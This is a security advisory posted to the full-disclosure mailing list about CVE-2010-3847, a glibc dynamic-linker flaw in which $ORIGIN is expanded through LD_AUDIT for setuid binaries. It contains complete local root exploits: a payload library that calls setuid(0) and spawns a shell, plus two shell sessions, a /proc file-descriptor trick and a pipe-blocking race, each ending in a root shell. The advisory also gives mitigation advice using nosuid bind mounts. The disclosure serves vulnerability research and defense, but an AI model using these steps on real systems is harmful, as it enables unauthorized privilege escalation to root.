from: http://marc.info/?l=full-disclosure&m=128739684614072&w=2

The GNU C library dynamic linker expands $ORIGIN in setuid library search path
------------------------------------------------------------------------------

Gruezi, This is CVE-2010-3847.

The dynamic linker (or dynamic loader) is responsible for the runtime linking of
dynamically linked programs. ld.so operates in two security modes, a permissive
mode that allows a high degree of control over the load operation, and a secure
mode (libc_enable_secure) intended to prevent users from interfering with the
loading of privileged executables.

$ORIGIN is an ELF substitution sequence representing the location of the
executable being loaded in the filesystem hierarchy. The intention is to allow
executables to specify a search path for libraries that is relative to their
location, to simplify packaging without spamming the standard search paths with
single-use libraries.

Note that despite the confusing naming convention, $ORIGIN is specified in a
DT_RPATH or DT_RUNPATH dynamic tag inside the executable itself, not via the
environment (developers would normally use the -rpath ld parameter, or
-Wl,-rpath,$ORIGIN via the compiler driver).

The ELF specification suggests that $ORIGIN be ignored for SUID and SGID
binaries,

http://web.archive.org/web/20041026003725/http://www.caldera.com/developers/gabi/2003-12-17/ch5.dynamic.html#substitution

"For security, the dynamic linker does not allow use of $ORIGIN substitution
 sequences for set-user and set-group ID programs. For such sequences that
 appear within strings specified by DT_RUNPATH dynamic array entries, the
 specific search path containing the $ORIGIN sequence is ignored (though other
 search paths in the same string are processed). $ORIGIN sequences within a
 DT_NEEDED entry or path passed as a parameter to dlopen() are treated as
 errors. The same restrictions may be applied to processes that have more than
 minimal privileges on systems with installed extended security mechanisms."

However, glibc ignores this recommendation. The attack the ELF designers were
likely concerned about is users creating hardlinks to suid executables in
directories they control and then executing them, thus controlling the
expansion of $ORIGIN.

It is tough to form a thorough complaint about this glibc behaviour however,
as any developer who believes they're smart enough to safely create suid
programs should be smart enough to understand the implications of $ORIGIN
and hard links on load behaviour. The glibc maintainers are some of the
smartest guys in free software, and well known for having a "no hand-holding"
stance on various issues, so I suspect they wanted a better argument than this
for modifying the behaviour (I pointed it out a few years ago, but there was
little interest).

However, I have now discovered a way to exploit this. The origin expansion
mechanism is recycled for use in LD_AUDIT support, although an attempt is made
to prevent it from working, it is insufficient.

LD_AUDIT is intended for use with the linker auditing api (see the rtld-audit
manual), and has the usual restrictions for setuid programs as LD_PRELOAD does.
However, $ORIGIN expansion is only prevented if it is not used in isolation.

The codepath that triggers this expansion is

   _dl_init_paths() -> _dl_dst_substitute() -> _is_dst()

(in the code below DST is dynamic string token)

http://sourceware.org/git/?p=glibc.git;a=blob;f=elf/dl-load.c;h=a7162eb77de7a538235a4326d0eb9ccb5b244c01;hb=HEAD#l741

 741       /* Expand DSTs.  */
 742       size_t cnt = DL_DST_COUNT (llp, 1);
 743       if (__builtin_expect (cnt == 0, 1))
 744         llp_tmp = strdupa (llp);
 745       else
 746         {
 747           /* Determine the length of the substituted string.  */
 748           size_t total = DL_DST_REQUIRED (l, llp, strlen (llp), cnt);
 749
 750           /* Allocate the necessary memory.  */
 751           llp_tmp = (char *) alloca (total + 1);
 752           llp_tmp = _dl_dst_substitute (l, llp, llp_tmp, 1);
 753         }

http://sourceware.org/git/?p=glibc.git;a=blob;f=elf/dl-load.c;h=a7162eb77de7a538235a4326d0eb9ccb5b244c01;hb=HEAD#l245

 253       if (__builtin_expect (*name == '$', 0))
 254         {
 255           const char *repl = NULL;
 256           size_t len;
 257
 258           ++name;
 259           if ((len = is_dst (start, name, "ORIGIN", is_path,
 260                              INTUSE(__libc_enable_secure))) != 0)
 261             {
   ...
 267                 repl = l->l_origin;
 268             }

http://sourceware.org/git/?p=glibc.git;a=blob;f=elf/dl-load.c;h=a7162eb77de7a538235a4326d0eb9ccb5b244c01;hb=HEAD#l171


 202   if (__builtin_expect (secure, 0)
 203       && ((name[len] != '\0' && (!is_path || name[len] != ':'))
 204           || (name != start + 1 && (!is_path || name[-2] != ':'))))
 205     return 0;
 206
 207   return len;
 208 }

As you can see, $ORIGIN is only expanded if it is alone and first in the path.
This makes little sense, and does not appear to be useful even if there were
no security impact. This was most likely the result of an attempt to re-use the
existing DT_NEEDED resolution infrastructure for LD_AUDIT support, accidentally
introducing this error.

Perhaps surprisingly, this error is exploitable.

--------------------
Affected Software
------------------------

At least the following versions have been tested

   2.12.1, FC13
   2.5, RHEL5 / CentOS5

Other versions are probably affected, possibly via different vectors. I'm aware
several versions of ld.so in common use hit an assertion in dl_open_worker, I
do not know if it's possible to avoid this.

--------------------
Consequences
-----------------------

It is possible to exploit this flaw to execute arbitrary code as root.

Please note, this is a low impact vulnerability that is only of interest to
security professionals and system administrators. End users do not need
to be concerned.

Exploitation would look like the following.

# Create a directory in /tmp we can control.
$ mkdir /tmp/exploit

# Link to an suid binary, thus changing the definition of $ORIGIN.
$ ln /bin/ping /tmp/exploit/target

# Open a file descriptor to the target binary (note: some users are surprised
# to learn exec can be used to manipulate the redirections of the current
# shell if a command is not specified. This is what is happening below).
$ exec 3< /tmp/exploit/target

# This descriptor should now be accessible via /proc.
$ ls -l /proc/$$/fd/3
lr-x------ 1 taviso taviso 64 Oct 15 09:21 /proc/10836/fd/3 -> /tmp/exploit/target*

# Remove the directory previously created
$ rm -rf /tmp/exploit/

# The /proc link should still exist, but now will be marked deleted.
$ ls -l /proc/$$/fd/3
lr-x------ 1 taviso taviso 64 Oct 15 09:21 /proc/10836/fd/3 -> /tmp/exploit/target (deleted)

# Replace the directory with a payload DSO, thus making $ORIGIN a valid target to dlopen().
$ cat > payload.c
void __attribute__((constructor)) init()
{
   setuid(0);
   system("/bin/bash");
}
^D
$ gcc -w -fPIC -shared -o /tmp/exploit payload.c
$ ls -l /tmp/exploit
-rwxrwx--- 1 taviso taviso 4.2K Oct 15 09:22 /tmp/exploit*

# Now force the link in /proc to load $ORIGIN via LD_AUDIT.
$ LD_AUDIT="\$ORIGIN" exec /proc/self/fd/3
sh-4.1# whoami
root
sh-4.1# id
uid=0(root) gid=500(taviso)

-------------------
Mitigation
-----------------------

It is a good idea to prevent users from creating files on filesystems mounted
without nosuid. The following interesting solution for administrators who
cannot modify their partitioning scheme was suggested to me by Rob Holland
(@robholland):

You can use bind mounts to make directories like /tmp, /var/tmp, etc., nosuid,
for example:

# mount -o bind /tmp /tmp
# mount -o remount,bind,nosuid /tmp /tmp

Be aware of race conditions at boot via crond/atd/etc, and users with
references to existing directories (man lsof), but this may be an acceptable
workaround until a patch is ready for deployment.

(Of course you need to do this everywhere untrusted users can make links to
suid/sgid binaries. find(1) is your friend).

If someone wants to create an init script that would automate this at boot for
their distribution, I'm sure it would be appreciated by other administrators.

-------------------
Solution
-----------------------

Major distributions should be releasing updated glibc packages shortly.

-------------------
Credit
-----------------------

This bug was discovered by Tavis Ormandy.

-------------------
Greetz
-----------------------

Greetz to Hawkes, Julien, LiquidK, Lcamtuf, Neel, Spoonm, Felix, Robert,
Asirap, Spender, Pipacs, Gynvael, Scarybeasts, Redpig, Kees, Eugene, Bruce D.,
and all my other elite friends and colleagues.

Additional greetz to the openwall guys who saw this problem coming years ago.
They continue to avoid hundreds of security vulnerabilities each year thanks to
their insight into systems security.

http://www.openwall.com/owl/

-------------------
Notes
-----------------------

There are several known techniques to exploit dynamic loader bugs for suid
binaries, the fexecve() technique listed in the Consequences section above is a
modern technique, making use of relatively recent Linux kernel features (it was
first suggested to me by Adam Langley while discussing CVE-2009-1894, but I
believe Gabriel Campana came up with the same solution independently).

The classic UNIX technique is a little less elegant, but has the advantage that
read access is not required for the target binary. It is rather common for
administrators to remove read access from suid binaries in order to make
attackers work a little harder, so I will document it here for reference.

The basic idea is to create a pipe(), fill it up with junk (pipes have 2^16
bytes capacity on Linux, see the section on "Pipe Capacity" in pipe(7) from the
Linux Programmers Manual), then dup2() it to stderr. Following the dup2(),
anything written to stderr will block, so you simply execve() and then make the
loader print some error message, allowing you to reliably win any race
condition.

LD_DEBUG has always been a a good candidate for getting error messages on
Linux. The behaviour of LD_DEBUG was modified a few years ago in response to
some minor complaints about information leaks, but it can still be used with a
slight modification (I first learned of this technique from a bugtraq posting
by Jim Paris in 2004, http://seclists.org/bugtraq/2004/Aug/281).

The exploit flow for this alternative attack is a little more complicated, but
we can still use the shell to do it (this session is from an FC13 system,
output cleaned up for clarity).

# Almost fill up a pipe with junk, then dup2() it to stderr using redirection.
$ (head -c 65534 /dev/zero; LD_DEBUG=nonsense LD_AUDIT="\$ORIGIN" /tmp/exploit/target 2>&1) | (sleep 1h; cat) &
[1] 26926

# Now ld.so is blocked on write() in the background trying to say "invalid
# debug option", so we are free to manipulate the filesystem.
$ rm -rf /tmp/exploit/

# Put exploit payload in place.
$ gcc -w -fPIC -shared -o /tmp/exploit payload.c

# Clear the pipe by killing sleep, letting cat drain the contents. This will
# unblock the target, allowing it to continue.
$ pkill -n -t $(tty | sed 's#/dev/##') sleep
-bash: line 99: 26929 Terminated          sleep 1h

# And now we can take control of a root shell :-)
$ fg
sh-4.1# id
uid=0(root) gid=500(taviso)

Another technique I'm aware of is setting a ridiculous LD_HWCAP_MASK, then
while the loader is trying to map lots of memory, you have a good chance of
winning any race. I previously found an integer overflow in this feature and
suggested adding LD_HWCAP_MASK to the unsecure vars list, however the glibc
maintainers disagreed and just fixed the overflow.

http://www.cygwin.com/ml/libc-hacker/2007-07/msg00001.html

I believe this is still a good idea, and LD_HWCAP_MASK is where I would bet the
next big loader bug is going to be, it's just not safe to let attackers have
that much control over the execution environment of privileged programs.

Finally, some notes on ELF security for newcomers. The following common
conditions are usually exploitable:

   - An empty DT_RPATH, i.e. -Wl,-rpath,""
     This is a surprisingly common build error, due to variable expansion
     failing during the build process.
   - A relative, rather than absolute DT_RPATH.
     For example, -Wl,-rpath,"lib/foo".

I'll leave it as an exercise for the interested reader to explain why. Remember
to also follow DT_NEEDED dependencies, as dependencies can also declare rpaths
for their dependencies, and so on.

-------------------
References
-----------------------

- http://man.cx/ld.so%288%29, The dynamic linker/loader, Linux Programmer's Manual.
- http://man.cx/rtld-audit, The auditing API for the dynamic linker, Linux Programmer's Manual.
- http://man.cx/pipe%287%29, Overview of pipes and FIFOs (Pipe Capacity), Linux Programmer's Manual.
- Linkers and Loaders, John R. Levine, ISBN 1-55860-496-0.
- Partitioning schemes and security, http://my.opera.com/taviso/blog/show.dml/654574
- CVE-2009-1894 description, http://blog.cr0.org/2009/07/old-school-local-root-vulnerability-in.html

You should subscribe to Linux Weekly News and help support their high standard
of security journalism.

http://lwn.net/

I have a twitter account where I occasionally comment on security topics.

http://twitter.com/taviso

ex$$